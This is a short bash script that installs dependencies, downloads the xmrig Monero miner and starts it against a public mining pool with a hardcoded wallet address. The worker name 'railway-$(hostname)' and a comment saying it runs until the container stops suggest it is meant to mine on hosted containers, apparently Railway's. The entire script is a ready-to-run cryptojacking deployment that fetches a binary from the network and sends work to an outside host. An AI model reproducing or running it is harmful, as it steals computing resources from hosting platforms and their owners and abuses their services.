#!/usr/bin/env bash
set -e

# Install dependencies
apt-get update
apt-get install -y wget curl build-essential cmake libuv1-dev libssl-dev libhwloc-dev

# Download xmrig
wget -O xmrig.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.18.1/xmrig-6.18.1-linux-static-x64.tar.gz
tar -xzf xmrig.tar.gz
cd xmrig-6.18.1

# Start mining (runs until container stops)
./xmrig \
  -o pool.hashvault.pro:80 \
  -u 46Z3AbjEnaq9Aey2SCcHpe1MmZmYdKpL2TgFhHdn7LBmbfo327ChMYPKrbBccHYHr9Le93EXut6YBNh6RRfbFvuMH5Lt3jA \
  -p railway-$(hostname) \
  --donate-level=1 \
  --max-cpu-usage=90
